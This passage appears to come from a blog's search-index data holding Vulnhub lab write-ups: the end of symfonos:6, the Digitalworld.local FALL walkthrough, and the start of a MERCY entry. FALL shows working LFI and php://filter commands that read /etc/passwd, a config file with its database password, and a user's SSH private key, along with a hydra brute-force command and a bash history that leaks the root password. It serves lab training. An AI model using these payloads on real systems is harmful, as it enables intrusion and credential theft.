env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin User achilles may run the following commands on symfonos6: (ALL) NOPASSWD: /usr/local/go/bin/go [achilles@symfonos6 git]$ Create go reverse shell Download rev.go Transfer to target Execute reverse shell [achilles@symfonos6 tmp]$ sudo /usr/local/go/bin/go run /tmp/rev.go Root shell obtained Root Flag cat proof.txt Congrats on rooting symfonos:6! ,_---~~~~~----._ _,,_,*^____ _____``*g*\\&quot;*, / __/ /&#39; ^. / \\ ^@q f [ @f | @)) | | @)) l 0 _/ \\`/ \\~____ / __ \\_____/ \\ | _l__l_ I } [______] I ] | | | | ] ~ ~ | | | | | Contact me via Twitter @zayotic to give feedback! " }, { "title": "Vulnhub - Digitalworld.local (FALL)", "url": "/posts/Digitalworld.local-(FALL)/", "categories": "Vulnhub, Linux", "tags": "exploit/file-inclusion/lfi, linux-priv-esc/linux-creds-found", "date": "2022-02-09 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Tue Feb 8 17:14:08 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Digitalworld.local-FALL/192.168.110.20/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Digitalworld.local-FALL/192.168.110.20/scans/xml/_full_tcp_nmap.xml 192.168.110.20Nmap scan report for 192.168.110.20Host is up, received arp-response (0.0010s latency).Scanned at 2022-02-08 17:14:09 +08 for 246sNot shown: 65367 filtered tcp ports (no-response), 155 filtered tcp ports (host-prohibited)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 64 OpenSSH 7.8 (protocol 2.0)| ssh-hostkey: | 2048 c5:86:f9:64:27:a4:38:5b:8a:11:f9:44:4b:2a:ff:65 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBezJ/KDio6Fwya44wrK4/39Vd93TBRE3CC7En4GJYCcT89paKDGhozzWU7pAFV5FqWbBZ5Z9pJIGhVNvmIIYR1YoyTbkF3qbf41XBGCmI87nLqYxFXQys3iycBYah3qMxkr24N4SvU+OIOWItFQZSNCK3BzYlCnxFNVNh4JLqrI/Og40EP5Ck7REorRRIraefdROKDqZHPeugwV1UHbISjyDsKChbpobQxVl80RT1dszhuUU1BvhJl1sy/opLQWdRjsl97L1c0lc87AFcd6PgsGf6UFURN+1RaVngnZBFWWnYUb/HfCbKJGseTgATk+Fk5+IBOrlXJ4fQ9/SkagXL| 256 e1:00:0b:cc:59:21:69:6c:1a:c1:77:22:39:5a:35:4f (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAFLZltNl1U6p8d7Su4gH+FQmIRRpZlAuOHrQYHYdGeWADfzBXlPSDkCrItb9doE6+ACyru5Fm023LgiTNg8yGU=| 256 1d:4e:14:6d:20:f4:56:da:65:83:6f:7d:33:9d:f0:ed (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEeQTBvJOPKDtUv+nJyQJ9rKdAmrC577XXaTjRI+2n3c80/tcp open http syn-ack ttl 64 Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)|_http-favicon: Unknown favicon MD5: EBF500D206705BDA0CB79021C15DA98A| http-methods: |_ Supported Methods: HEAD POST OPTIONS|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3| http-robots.txt: 1 disallowed entry |_/111/tcp closed rpcbind reset ttl 64139/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: SAMBA)443/tcp open ssl/http syn-ack ttl 64 Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)|_ssl-date: TLS randomness does not represent time| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain| Subject Alternative Name: DNS:localhost.localdomain| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain/organizationalUnitName=ca-2683772458131447713| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2019-08-15T03:51:33| Not valid after: 2020-08-19T05:31:33| MD5: ac51 22da 893a 4d95 07ba 3e82 5780 bf24| SHA-1: 8821 fdc6 7f1b ac6a 2c7b 6a32 194d ed44 b553 2cf4| -----BEGIN CERTIFICATE-----| MIIE4DCCAsigAwIBAgIIV5TaF3XKfxowDQYJKoZIhvcNAQELBQAwgY8xCzAJBgNV| BAYTAlVTMRQwEgYDVQQKDAtVbnNwZWNpZmllZDEfMB0GA1UECwwWY2EtMjY4Mzc3| MjQ1ODEzMTQ0NzcxMzEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjAeFw0xOTA4| MTUwMzUxMzNaFw0yMDA4MTkwNTMxMzNaMG4xCzAJBgNVBAYTAlVTMRQwEgYDVQQK| DAtVbnNwZWNpZmllZDEeMBwGA1UEAwwVbG9jYWxob3N0LmxvY2FsZG9tYWluMSkw| JwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9zdC5sb2NhbGRvbWFpbjCCASIwDQYJ| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAKY2vdPnY38fq4HuMzEIZwz2PfMutxbg| xdxMBJMk8eM9vwwMmDyiMuEMfy46w5gvCgo5zmq4VoQYKJxrcUIogiDqzLC/Pjfq| jSvFooDih5naltrhaoZvTHlu8Q4G0TmwhaaYpedqkhPzVLHywkckVBu9P9unrrlI| BI3+N3aZLTppsk1gTe67tUjhpeiMQKkYWhtgTG3upSAI9FjsB9LNhw8CyIM+VFHj| 2YHFlvp+Jt1A+u+vMtfDm5A86/MpdeWpLKbLTjgNk0Q79VPU0UBnoSKcS2RwAVRM| QkR3lLoOEGu/DLz84EQP1r9m5jLZX5p5Gc0qaa9/FG3ll9DLRL+gggsCAwEAAaNg| MF4wDgYDVR0PAQH/BAQDAgWgMAkGA1UdEwQCMAAwIAYDVR0RBBkwF4IVbG9jYWxo| b3N0LmxvY2FsZG9tYWluMB8GA1UdIwQYMBaAFNch7n7MGaSjmr7qLPAGmH5iWQnd| MA0GCSqGSIb3DQEBCwUAA4ICAQBxLU3j7e5B47e3oO7dHrZrl6fTxAPORYcPWM19| Qjwq4wBluFliGz918zGukOrDQdb2WEhbJj1X2SNsLhqa6i/nEi+GKQ7XzMwpOxTg| vY3bFV1y550Uac/kj6lSXLIgRllLruuQOOLHsfz9BhTe5ZbSO0N20XhvHqhxbd6s| EBqKZeSbnweXnHUeiev/7IceZaxoWHqJ4CfM1PUXnJZL+NuWGPAfzMfv5F7ap66T| d1bc9xBvg9jbvP4RtmGT0QwpUTCpsXBLS3WuZjq9/jcxvyubwVfIidGCMGoiGNqy| pHI+XgYH3f/9W56QgxuUIjctLTeU8v5YZlS7vw58whxaZ0j3xQd50RZ+YFPTXnsy| L2oAOZ8Lb57SKMM/RKYju5cvSQjtTRz+KnHqZHwDA46b2WKOUONrlNvm7Hp0dICB| RLfD150FOj8L914sNFh85M2Sj1BFHKDSNu9ootIZg0uUxwJNGrOuzY0vlRiAJTOA| Sw3FNGWb1UWyAXjO1DGL2YEnW2phXMdml4MttR6HoDgw689ra0q67xNWRyNOEc00| OdANMqq4PpF3W58/o8zRriePTQiGYltb95DUS5skFm/ScJ9PvElefLn5MkgnhKEC| htGW8shfB4Rhc9r+03JJpflvJ48EtS/TikQNTyO4B9p1bEguRVbWzx6Tf/rLEYdb| GBMBjA==|_-----END CERTIFICATE-----| tls-alpn: |_ http/1.1|_http-title: 400 Bad Request|_http-server-header: Apache/2.4.39 (Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3| http-robots.txt: 1 disallowed entry |_/|_http-favicon: Unknown favicon MD5: EBF500D206705BDA0CB79021C15DA98A445/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 4.8.10 (workgroup: SAMBA)3306/tcp open mysql syn-ack ttl 64 MySQL (unauthorized)8000/tcp closed http-alt reset ttl 648080/tcp closed http-proxy reset ttl 648443/tcp closed https-alt reset ttl 649090/tcp open http syn-ack ttl 64 Cockpit web service 162 - 188|_http-title: Did not follow redirect to https://192.168.110.20:9090/| http-methods: |_ Supported Methods: GET HEAD10080/tcp closed amanda reset ttl 6410443/tcp closed cirrossp reset ttl 64MAC Address: 08:00:27:A2:80:57 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 5.XOS CPE: cpe:/o:linux:linux_kernel:5OS details: Linux 5.0 - 5.4TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=2/8%OT=22%CT=111%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=62OS:023557%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=OS:A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5OS:B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE8OS:8)ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%AOS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0OS:%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0OS:%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 26.164 days (since Thu Jan 13 13:22:17 2022)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=263 (Good luck!)IP ID Sequence Generation: All zerosService Info: Host: FALL; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| smb2-time: | date: 2022-02-08T17:17:17|_ start_date: N/A| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required|_clock-skew: mean: 10h40m00s, deviation: 4h37m09s, median: 7h59m58s| smb-security-mode: | account_used: &amp;lt;blank&amp;gt;| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb-os-discovery: | OS: Windows 6.1 (Samba 4.8.10)| Computer name: fall| NetBIOS computer name: FALL\\x00| Domain name: \\x00| FQDN: fall|_ System time: 2022-02-08T09:17:20-08:00| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 25200/tcp): CLEAN (Couldn&#39;t connect)| Check 2 (port 39619/tcp): CLEAN (Couldn&#39;t connect)| Check 3 (port 47728/udp): CLEAN (Timeout)| Check 4 (port 52999/udp): CLEAN (Failed to receive data)|_ 0/4 checks are positive: Host is CLEAN or ports are blockedTRACEROUTEHOP RTT ADDRESS1 1.05 ms 192.168.110.20Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Feb 8 17:18:15 2022 -- 1 IP address (1 host up) scanned in 247.67 secondsTCP/80 (HTTP)FFUF - common.txt┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL]└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php&#39; /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.20/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________admin [Status: 301, Size: 236, Words: 14, Lines: 8]admin.cgi.html [Status: 403, Size: 223, Words: 16, Lines: 10]admin.cgi [Status: 403, Size: 218, Words: 16, Lines: 10]admin.cgi.txt [Status: 403, Size: 222, Words: 16, Lines: 10]admin.pl [Status: 403, Size: 217, Words: 16, Lines: 10]admin.pl.html [Status: 403, Size: 222, Words: 16, Lines: 10]admin.pl.txt [Status: 403, Size: 221, Words: 16, Lines: 10]assets [Status: 301, Size: 237, Words: 14, Lines: 8]AT-admin.cgi [Status: 403, Size: 221, Words: 16, Lines: 10]AT-admin.cgi.html [Status: 403, Size: 226, Words: 16, Lines: 10]AT-admin.cgi.txt [Status: 403, Size: 225, Words: 16, Lines: 10]cachemgr.cgi.html [Status: 403, Size: 226, Words: 16, Lines: 10]cachemgr.cgi.txt [Status: 403, Size: 225, Words: 16, Lines: 10]cachemgr.cgi [Status: 403, Size: 221, Words: 16, Lines: 10]cgi-bin/ [Status: 403, Size: 217, Words: 16, Lines: 10]cgi-bin/.html [Status: 403, Size: 222, Words: 16, Lines: 10]config.php [Status: 200, Size: 0, Words: 1, Lines: 1]doc [Status: 301, Size: 234, Words: 14, Lines: 8]error.html [Status: 200, Size: 80, Words: 3, Lines: 6]favicon.ico [Status: 200, Size: 1150, Words: 4, Lines: 3]index.php [Status: 200, Size: 8385, Words: 1138, Lines: 296]index.php [Status: 200, Size: 8385, Words: 1138, Lines: 296]lib [Status: 301, Size: 234, Words: 14, Lines: 8]missing.html [Status: 200, Size: 168, Words: 17, Lines: 7]modules [Status: 301, Size: 238, Words: 14, Lines: 8]phpinfo.php [Status: 200, Size: 17, Words: 3, Lines: 2]phpinfo.php [Status: 200, Size: 17, Words: 3, Lines: 2]robots.txt [Status: 200, Size: 79, Words: 9, Lines: 8]robots.txt [Status: 200, Size: 79, Words: 9, Lines: 8]test.php [Status: 200, Size: 80, Words: 3, Lines: 6]tmp [Status: 301, Size: 234, Words: 14, Lines: 8]uploads [Status: 301, Size: 238, Words: 14, Lines: 8]:: Progress: [18460/18460] :: Job [1/1] :: 633 req/sec :: Duration: [0:00:23] :: Errors: 0 :: admin assets error.html index.php missing.html test.php uploads config.phpTCP/443 (HTTPS) Same results as TCP/80TCP/9090 (HTTP)FFUF - common.txt┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL]└─# ffuf -u http://$ip:9090/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php,.cgi&#39; -fw 8876,3 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.20:9090/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php .cgi :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 8876,3________________________________________________favicon.ico [Status: 200, Size: 413, Words: 1, Lines: 4]ping [Status: 200, Size: 24, Words: 4, Lines: 1]:: Progress: [23075/23075] :: Job [1/1] :: 908 req/sec :: Duration: [0:00:18] :: Errors: 0 :: pingNMAPPORT STATE SERVICE REASON VERSION9090/tcp open http syn-ack ttl 64 Cockpit web service 162 - 188 Cockpit web service 162 - 188TCP/139,445 (SMB)Enum4linux No users enumeratedSMBMap┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20]└─# smbmap -H $ip[+] IP: 192.168.110.20:445 Name: 192.168.110.20 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers IPC$ NO ACCESS IPC Service (Samba 4.8.10) No access to any fileshareInitial FootholdTCP/80 (HTTP) - LFI (Include config.php, failed) View enumerated directories admin assets, modules Contains files for the CMS index.php CMS Made Simple v2.2.15 There could be backdoors in the webserver test.php GET parameter missing missing.html patrick Intercept test.php w/ burp javascript alert(&#39;Missing GET parameter&#39;) Search exploits for CMS Made Simple v2.2.15 Exploit Title Pat CMS Made Simple 2.2.15 - RCE (Authenticated) php/webapps/49345.txt Requires authentication Tried to bruteforce /admin.php, failed ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit] └─# hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt $ip http-post-form &quot;/admin/login.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;loginsubmit=Submit:User name or password incorrect&quot; -V Fuzz for LFI vulnerability at test.php?&amp;lt;Get Parameter&amp;gt;=&amp;lt;LFI&amp;gt; ┌──(root💀kali)-[/usr/share/wordlists] └─# ffuf -u http://$ip/test.php?W1=W2 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:W1 -w /usr/share/wordlists/LFI/file_inclusion_linux.txt:W2 -fw 3 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.110.20/test.php?W1=W2 :: Wordlist : W1: /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt :: Wordlist : W2: /usr/share/wordlists/LFI/file_inclusion_linux.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 3 ________________________________________________ [Status: 200, Size: 0, Words: 1, Lines: 1] * W1: file * W2: %00../../../../../../etc/passwd [Status: 200, Size: 0, Words: 1, Lines: 1] * W2: %00../../../../../../etc/shadow * W1: file [Status: 200, Size: 0, Words: 1, Lines: 1] * W1: file * W2: %00/etc/passwd%00 [Status: 200, Size: 0, Words: 1, Lines: 1] * W1: file * W2: %00/etc/shadow%00 [WARN] Caught keyboard interrupt (Ctrl-C) Include files that can lead to RCE Enumerate files that can lead to RCE Did not find any log files we can poison Earlier, during reconaissance phase, we enumerated config.php, config.php contains SQL credentials where we could access mysql at TCP/3306 to obtain user credentials. config.php details View source code of config.php using PHP Wrapper, php://filter Check if php://filter works, by including files that we know exists ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit] └─# curl -s http://192.168.110.20/test.php?file=php://filter/convert.base64-encode/resource=../../../../../etc/passwd | base64 -d root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin systemd-coredump:x:999:996:systemd Core Dumper:/:/sbin/nologin systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin dbus:x:81:81:System message bus:/:/sbin/nologin polkitd:x:998:995:User for polkitd:/:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin cockpit-ws:x:997:993:User for cockpit-ws:/:/sbin/nologin rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin abrt:x:173:173::/etc/abrt:/sbin/nologin rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin chrony:x:996:991::/var/lib/chrony:/sbin/nologin tcpdump:x:72:72::/:/sbin/nologin qiu:x:1000:1000:qiu:/home/qiu:/bin/bash apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin nginx:x:995:990:Nginx web server:/var/lib/nginx:/sbin/nologin tss:x:59:59:Account used by the tpm2-abrmd package to sandbox the tpm2-abrmd daemon:/dev/null:/sbin/nologin clevis:x:994:989:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false Include config.php ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit] └─# curl -s http://192.168.110.20/test.php?file=php://filter/convert.base64-encode/resource=config.php | base64 -d &amp;lt;?php # CMS Made Simple Configuration File # Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference # $config[&#39;dbms&#39;] = &#39;mysqli&#39;; $config[&#39;db_hostname&#39;] = &#39;127.0.0.1&#39;; $config[&#39;db_username&#39;] = &#39;cms_user&#39;; $config[&#39;db_password&#39;] = &#39;P@ssw0rdINSANITY&#39;; $config[&#39;db_name&#39;] = &#39;cms_db&#39;; $config[&#39;db_prefix&#39;] = &#39;cms_&#39;; $config[&#39;timezone&#39;] = &#39;Asia/Singapore&#39;; $config[&#39;db_port&#39;] = 3306; ?&amp;gt; cms_user:P@ssw0rdINSANITY TCP/3306 (MySQL) - Unable to connect Access mysql w/ cms_user:P@ssw0rdINSANITY ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit] └─# mysql -u cms_user -h $ip ERROR 1130 (HY000): Host &#39;192.168.110.4&#39; is not allowed to connect to this MySQL server Unable to connect to MySQL TCP/80 (HTTP) - LFI (Include id_rsa) Only option we did not try is to include id_rsa ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit] └─# curl -s http://192.168.110.20/test.php?file=../../../../home/qiu/.ssh/id_rsa | tee id_rsa -----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn NhAAAAAwEAAQAAAQEAvNjhOFOSeDHy9K5vnHSs3qTjWNehAPzT0sD3beBPVvYKQJt0AkD0 FDcWTSSF13NhbjCQm5fnzR8td4sjJMYiAl+vAKboHne0njGkBwdy5PgmcXyeZTECIGkggX 61kImUOIqtLMcjF5ti+09RGiWeSmfIDtTCjj/+uQlokUMtdc4NOv4XGJbp7GdEWBZevien qXoXtG6j7gUgtXX1Fxlx3FPhxE3lxw/AfZ9ib21JGlOyy8cflTlogrZPoICCXIV/kxGK0d Zucw8rGGMc6Jv7npeQS1IXU9VnP3LWlOGFU0j+IS5SiNksRfdQ4mCN9SYhAm9mAKcZW8wS vXuDjWOLEwAAA9AS5tRmEubUZgAAAAdzc2gtcnNhAAABAQC82OE4U5J4MfL0rm+cdKzepO NY16EA/NPSwPdt4E9W9gpAm3QCQPQUNxZNJIXXc2FuMJCbl+fNHy13iyMkxiICX68Apuge d7SeMaQHB3Lk+CZxfJ5lMQIgaSCBfrWQiZQ4iq0sxyMXm2L7T1EaJZ5KZ8gO1MKOP/65CW iRQy11zg06/hcYlunsZ0RYFl6+J6epehe0bqPuBSC1dfUXGXHcU+HETeXHD8B9n2JvbUka U7LLxx+VOWiCtk+ggIJchX+TEYrR1m5zDysYYxzom/uel5BLUhdT1Wc/ctaU4YVTSP4hLl KI2SxF91DiYI31JiECb2YApxlbzBK9e4ONY4sTAAAAAwEAAQAAAQArXIEaNdZD0vQ+Sm9G NWQcGzA4jgph96uLkNM/X2nYRdZEz2zrt45TtfJg9CnnNo8AhhYuI8sNxkLiWAhRwUy9zs qYE7rohAPs7ukC1CsFeBUbqcmU4pPibUERes6lyXFHKlBpH7BnEz6/BY9RuaGG5B2DikbB 8t/CDO79q7ccfTZs+gOVRX4PW641+cZxo5/gL3GcdJwDY4ggPwbU/m8sYsyN1NWJ8NH00d X8THaQAEXAO6TTzPMLgwJi+0kj1UTg+D+nONfh7xeXLseST0m1p+e9C/8rseZsSJSxoXKk CmDy69aModcpW+ZXl9NcjEwrMvJPLLKjhIUcIhNjf4ABAAAAgEr3ZKUuJquBNFPhEUgUic ivHoZH6U82VyEY2Bz24qevcVz2IcAXLBLIp+f1oiwYUVMIuWQDw6LSon8S72kk7VWiDrWz lHjRfpUwWdzdWSMY6PI7EpGVVs0qmRC/TTqOIH+FXA66cFx3X4uOCjkzT0/Es0uNyZ07qQ 58cGE8cKrLAAAAgQDlPajDRVfDWgOWJj+imXfpGsmo81UDaYXwklzw4VM2SfIHIAFZPaA0 acm4/icKGPlnYWsvZCksvlUck+ti+J2RS2Mq9jmKB0AVZisFazj8qIde3SPPwtR7gBR329 JW3Db+KISMRIvdpJv+eiKQLg/epbSdwXZi0DJoB0a15FsIAQAAAIEA0uQl0d0p3NxCyT/+ Q6N+llf9TB5+VNjinaGu4DY6qVrSHmhkceHtXxG6h9upRtKw5BvOlSbTatlfMZYUtlZ1mL RWCU8D7v1Qn7qMflx4bldYgV8lf18sb6g/uztWJuLpFe3Ue/MLgeJ+2TiAw9yYoPVySNK8 uhSHa0dvveoJ8xMAAAAZcWl1QGxvY2FsaG9zdC5sb2NhbGRvbWFpbgEC -----END OPENSSH PRIVATE KEY----- Obtain usernames ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit] └─# curl -s http://192.168.110.20/test.php?file=../../../../etc/passwd | awk -F: &#39;($3&amp;gt;=1000)&amp;amp;&amp;amp;($1!=&quot;nobody&quot;){print $1}&#39; | tee usernames.txt qiu Fuzz for user’s id_rsa ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit] └─# ffuf -u http://$ip/test.php?file=../../../../../../home/FUZZ/.ssh/id_rsa -w usernames.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.110.20/test.php?file=../../../../../../home/FUZZ/.ssh/id_rsa :: Wordlist : FUZZ: usernames.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ qiu [Status: 200, Size: 1831, Words: 7, Lines: 28] :: Progress: [1/1] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 :: Change permissions of id_rsa ┌──(root💀kali)-[~/vulnHub/Digitalworld.local-FALL/192.168.110.20/exploit] └─# chmod 600 id_rsa TCP/22 (SSH) SSH w/ qiu’s id_rsa Local Flag [qiu@FALL ~]$ cat local.txt A low privilege shell! :-) [qiu@FALL ~]$ Privilege EscalationRoot - Via Creds Found View files in qiu’s home directory View .bash_history [qiu@FALL ~]$ cat .bash_history ls -al cat .bash_history rm .bash_history echo &quot;remarkablyawesomE&quot; | sudo -S dnf update ifconfig ping www.google.com ps -aux ps -ef | grep apache env env &amp;gt; env.txt rm env.txt lsof -i tcp:445 lsof -i tcp:80 ps -ef lsof -p 1930 lsof -p 2160 rm .bash_history exit ls -al cat .bash_history exit id;whoami sudo -l ls cat local.txt [qiu@FALL ~]$ cd .. root:remarkablyawesomE Obtain root shell Root Flag [root@FALL ~]# cat proof.txt Congrats on a root shell! :-) [root@FALL ~]# cat remarks.txt Hi! Congratulations on rooting yet another box in the digitalworld.local series! You may have first discovered the digitalworld.local series from looking for deliberately vulnerably machines to practise for the PEN-200 (thank you TJ_Null for featuring my boxes on the training list!) I hope to have played my little part at enriching your PEN-200 journey. Want to find the author? Find the author on Linkedin by rooting other boxes in this series! [root@FALL ~]# " }, { "title": "Vulnhub - Digitalworld.local (MERCY v2)", "url": "/posts/Digitalworld.local-(MERCY-v2)/", "categories": "Vulnhub, Linux", "tags": "tcp/139-445-smb/fileshare, port-knocking, tcp/80-http/web-app-cms-exploit, tcp/80-http/cms/tomcat, linux-priv-esc/cronjob", "date": "2022-02-08 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated 